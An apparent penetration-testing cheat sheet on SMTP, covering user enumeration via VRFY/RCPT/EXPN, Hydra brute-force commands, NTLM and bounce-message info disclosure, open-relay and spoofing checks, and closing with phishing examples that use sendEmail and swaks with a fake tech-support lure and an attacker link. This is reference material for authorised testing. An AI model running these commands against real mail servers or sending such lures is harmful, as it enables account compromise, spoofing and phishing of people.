---
description: (TCP 587, 25, 465)
---

# SMTP

## :information\_source: Introduction

#### [Simple Mail Transfer Protocol ](https://tools.ietf.org/html/rfc821/)

used for submission (send) or relay. mostly widely-used SMTP  on linux is **sendmail** service, on windows, its **Microsoft Exchange**. both can be setup to support POP3.



#### submission:

For Explicit SSL/TLS uses port TCP 587 or 2525

For Implicit SSL/TLS uses port TCP 465

#### Relay:

port TCP 25

## :ballot\_box\_with\_check: Checklist

* [ ] User enumeration
* [ ] Login brute force
* [ ] Check for info disclosure in  delivery status notification
* [ ] Check for SMTP-NTLM Auth info disclosure
* [ ] Check for open relay
* [ ] Test other scenarios with SMTP commands

## Enumeration

```
# SMTP
nmap -p smtp* [target]
nc -nv [target ip] 25
use auxiliary/scanner/smtp/smtp_version
nmap -p25 --script smtp-commands 10.10.10.10
lf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587


# SMTPS
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```

## Find Mail Server

```
dig +short mx google.com
```

## Connect

```
telnet 192.168.13.26 25 # user IP or domain name
nc 192.168.13.26 25 
```

## User Enumeration

There are 3 methods (SMTP commands) to test for existance of a user in SMTP service:

1. VRFY
2. RCPT
3. EXPN

```
smtp-user-enum -M  [method]  -U  <userlist>  -t  <target IP>
use auxiliary/scanner/smtp/smtp_enum
nmap -sV --script smtp-enum-users
# use smtp-enum-users.methods={EXPN,RCPT,VRFY}  to test different methods
nmap --script smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,...},...] -p 25,465,587 <host>
```

### Telnet

#### RCPT TP

```
telnet 10.0.10.1 25
HELO x
MAIL FROM:test@test.org
RCPT TO:test

# last command will return "User Unknown" if the user doesnt exist
# it will return "Recipient ok" if the user does exist
```

#### VRFY

```
VRFY root
# responds with response code 250 if root user exists
# responds with response code 550 if root doesnt exist
```

#### EXPN

```
EXPN root
250 2.1.5 <ed.williams@myhost>  # root doesnt exist
EXPN sshd
2.1.5 sshd privsep <sshd@mail2>  # sshd exists
```

### python script for verifying users

{% hint style="info" %}
change the "method" variable to test for different methods of user enumeration.
{% endhint %}

```python
#!/usr/bin/python
import socket
import sys
method = "VRFY "
if len(sys.argv) != 2:
print "Usage: vrfy.py [username]"
sys.exit(0)
# Create a Socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Connect to the Server
connect = s.connect(('10.11.1.217',25))
# Receive the banner
banner = s.recv(1024)
print banner
# VRFY a user
s.send( method + sys.argv[1] + '\r\n')
result = s.recv(1024)
print result
# Close the socket
s.close() 
```

{% embed url="https://github.com/cytopia/smtp-user-enum" %}

{% embed url="https://github.com/z0mbiehunt3r/smtp-enum" %}

## Login Brute Force

```
nmap -p 25 --script smtp-brute <host>
use auxiliary/scanner/smtp/smtp_enum
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```

## Delivery Status Notification Disclosure

&#x20;If you send an **email** to an organisation to an **invalid address**, the organisation will notify that the address was invalided sending a **mail back to you**. **Headers** of the returned email will **contain** possible **sensitive information** (like IP address of the mail services that interacted with the reports or anti-virus software info).

example:

```
 MAIL FROM:<bob@alpha.lan>
 RCPT TO:<alice@bravo.lan>
 DATA
 < 354 data;end with <CRLF>.<CRLF> 
> Blah blah blah... 
> ... 
> <CRLF>.<CRLF> 
< 250 OK
```

If a SMTP server has accepted the task of relaying a message and later finds that the recipient is incorrect, or that the mail cannot be delivered for whatever reason, then it must construct a NDN message and send it to the originator of the undeliverable mail.

## SMTP - NTLM Auth

#### ( Internal Information disclosure )

In Windows environment (MS Exchange) with SMTP - NTLM Auth available, if an attacker sends a null NTLM Auth request, the server to respond with a NTLMSSP message and disclose some information about the target host such as NetBIOS, DNS, OS and version.&#x20;

### nmap

```
nmap -p 25,465,587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=domain.com <target>
```

### Manual

```
root@kali: telnet example.com 587 
220 example.com SMTP Server Banner 
>> HELO 
250 example.com Hello [x.x.x.x] 
>> AUTH NTLM 334 
NTLM supported 
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```

#### the same issue exists for IMAP service as well.

## Internal Server Name - Information Disclosure

#### Some SMTP servers auto-complete a sender's address when command "MAIL FROM" is issued without a full address, disclosing its internal name:

```
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```

## Open Relay Attack&#x20;



An SMTP server that works as an open relay, is a email server that does not verify if the user is authorized to send email from the specified email address. Therefore, users would be able to send email originating from any third-party email address that they want.

### Manual

```
telnet [server_addr] [port]
helo test
ehlo [hostname] - show supported options on smtp server
mail from: < [spoofed_email]>
rcpt to: <[receipt_mail]> - ***  in case the smtp relay is not allowed on the server,”relay not allowed error” will be displayed after typing the rcpt to:<> or access denied or ***
data
subject: test for smtp

[some text for test]
.
quit
```

### Automated

```
nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=<domain>,smtp-open-relay.ip=<address>,...] -p 25,465,587 <host>
use auxiliary/scanner/smtp/smtp_relay
```

## Mail Spoofing

#### [HackTricks ](https://book.hacktricks.xyz/pentesting/pentesting-smtp#mail-spoofing)has a good explanation for mail spoofing attacks.

### Check for Mail Spoofing Via  SPF and DMARC Records

{% embed url="https://github.com/serain/mailspoof" %}

### Validating SPF and DMARC DNS Records

{% embed url="https://pypi.org/project/checkdmarc" %}

### Sending Fake Email

{% embed url="https://www.mailsploit.com/index" %}

{% embed url="http://www.anonymailer.net" %}

## SMTP Commands

#### HELO

&#x20;(Hello) The client sends this command to the SMTP server to identify itself and initiate the SMTP conversation. The domain name or IP address of the SMTP client is usually sent as an argument together with the command (e.g. “HELO client.example.com”). If a domain name is used as an argument with the HELO command, it must be a fully qualified domain name (also called FQDN)

```
helo w4lk3r
```

#### MAIL FROM&#x20;

Specifies the e-mail address of the sender. This command also tells the SMTP server that a new mail transaction is starting and makes the server to reset all its state tables and buffers etc. This command is usually sent as the first command after the identifying and login process. If the senders e-mail address is accepted the server will reply with a 250 OK reply code. Example:

```
C: MAIL FROM:[mail@samlogic.com]
S: 250 OK
```

#### RCPT TO&#x20;

(Recipient To) Specifies the e-mail address of the recipient. This command can be repeated multiple times for a give n e-mail message in order to deliver a single e-mail message to ultiple recipients. The example below shows how this command can be used to send same e-mail message to two recipients:

```
C: MAIL FROM:[mail@samlogic.com]
S: 250 OK
C: RCPT TO:[john@mail.com]
S: 250 OK
C: RCPT TO:[peggy@mail.com]
S: 250 OK
```

#### DATA&#x20;

The DATA command starts the transfer of th e message contents (body text, attachments etc). After that the DATA command has been sent to the server from the client, the server will respond with a 354 reply code. After that, the message contents can be transferred to the server. When al l message contents have been sent, a single dot (“.”) must be sent in a li ne by itself. If the message is accepted for delivery, the SMTP server wil l response with a 250 reply code. Example (the message contents is set to italic in the example below):

```
C: DATA
S: 354 Send message content; end with [CRLF].[CRLF]
C: Date: Thu, 21 May 2008 05:33:29 -0700
C: From: SamLogic [mail@samlogic.com]
C: Subject: The Next Meeting
C: To: john@mail.com
C:
C: Hi John,
C: The next meeting will be on Friday.
C: /Anna.
C: .
S: 250 OK
```

#### RSET&#x20;

(Reset) If the RSET command is sent to the e-mail se rver the current mail transaction will be aborted. The connection wi ll not be closed (this is reserved for the QUIT command, see below) but a ll information about the sender, recipients and e-mail data will be remo ved and buffers and state tables will be cleared.

#### VRFY

&#x20;(Verify) This command asks the server to confirm that a specified user name or mailbo x is valid (exists). If the user name is asked, the full name of the u ser and the fully specified mailbox are returned. In some e-mail servers the VRFY command is ignored because it can be a security hole. The command c an be used to probe for login names on servers. Servers that ignore the VRF Y command will usually send some kind of reply, but they will not send the i nformation that the client asked for

#### NOOP&#x20;

(No operation) The NOOP command does nothing else than makes the receiver to send a n OK reply. The main purpose is to check that the server is still connec ted and is able to communicate with the client.

#### QUIT&#x20;

Asks the server to close the connection. If the connection can be closed the servers replies with a 221 numerical code and then is the session closed.

### wrapping up

sending an email from linux:

```
root@kali:~# sendEmail -t itdept@victim.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a /tmp/BestComputers-UpgradeInstructions.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
  - First line must be received within 60 seconds.
  - End manual input with a CTRL-D on its own line.
IT Dept,
We are sending this important file to all our customers. It contains very important instructions for upgrading and securing your software. Please read and let us know if you have any problems.
Sincerely,
```

```
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```

